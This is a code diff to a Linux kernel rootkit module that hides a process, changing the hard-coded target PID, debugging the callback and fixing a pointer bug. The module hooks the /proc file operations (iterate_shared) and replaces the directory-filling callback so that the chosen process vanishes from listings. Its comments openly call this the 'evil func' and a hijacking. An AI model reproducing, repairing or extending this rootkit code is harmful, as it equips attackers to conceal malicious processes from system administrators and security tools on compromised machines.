@@ -4,7 +4,7 @@
 #include <linux/namei.h>
 #include <linux/fs.h>
 #include <linux/proc_fs.h>
-#define proc_pid_to_hide "10024"
+#define proc_pid_to_hide "19787"
 static struct file_operations *backup_fops;
 static struct file_operations proc_fops;
 static struct inode *proc_inode;
@@ -13,7 +13,10 @@ static struct dir_context *backup_ctx;
 static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned intd_type)
 {
     if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
-        return 0;
+    {
+        printk(KERN_ALERT "found proc");
+        return -2;
+    }
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, intd_type);
 }
 int (* backup_iterate_shared) (struct file*, struct dir_context *);
@@ -38,11 +41,11 @@ static int __init process_hide(void)
         return 0;
     //get the inode
     proc_inode = p.dentry->d_inode;
-    //get a copt of fop from inode
+    //get a copy of fop from inode
     proc_fops = *proc_inode->i_fop;
     //backup the fop
-    *backup_fops = *proc_inode->i_fop;
-    //modify the copy with out evil func
+    backup_fops = proc_inode->i_fop;
+    //modify the copy with out evil func (the hyjcking)
     proc_fops.iterate_shared = rk_iterate_shared;
     //overwrite the proc entry's fops
     proc_inode->i_fop = &proc_fops;
